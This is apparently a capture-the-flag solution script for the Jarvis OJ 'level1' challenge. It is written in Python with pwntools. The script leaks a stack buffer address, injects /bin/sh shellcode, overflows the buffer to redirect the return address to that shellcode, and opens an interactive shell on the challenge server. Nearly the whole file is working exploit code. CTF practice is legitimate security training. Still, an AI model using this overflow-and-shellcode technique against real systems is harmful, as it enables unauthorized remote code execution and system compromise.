#!/usr/bin/env python
# coding=utf-8
# author:muhe
# http://www.cnblogs.com/0xmuhe/
from pwn import *
nc='pwn2.jarvisoj.com'
point=9877
################# 
'''

p = process('./level1.80eacdcd51aca92af7749d96efad7fb5')
#junk = "A"*0x88
#addr1= 0x400596
shellcode=asm(shellcraft.sh()) #创建/bin/sh函数
this=p.recvline()[12:-2]		#截取回显buf地址字符串
addr2=int(this,16)				#字符串转十进制数
payload=shellcode+'A'*(0x8c-len(shellcode))+p32(addr2)	 #buf  写入/bin/sh ，溢出  回到shellcode地址
#payload = ''
#payload+=junk
#payload+=p64(addr1)
p.send(payload)

#################

'''
p = remote(nc,point)
#junk = "A"*0x88
#addr1= 0x400596
shellcode=asm(shellcraft.sh())
this=p.recvline()[12:-2]
addr2=int(this,16)
payload=shellcode+'A'*(0x8c-len(shellcode))+p32(addr2)
#payload = ''
#payload+=junk
#payload+=p64(addr1)
p.send(payload)

#################







p.interactive()
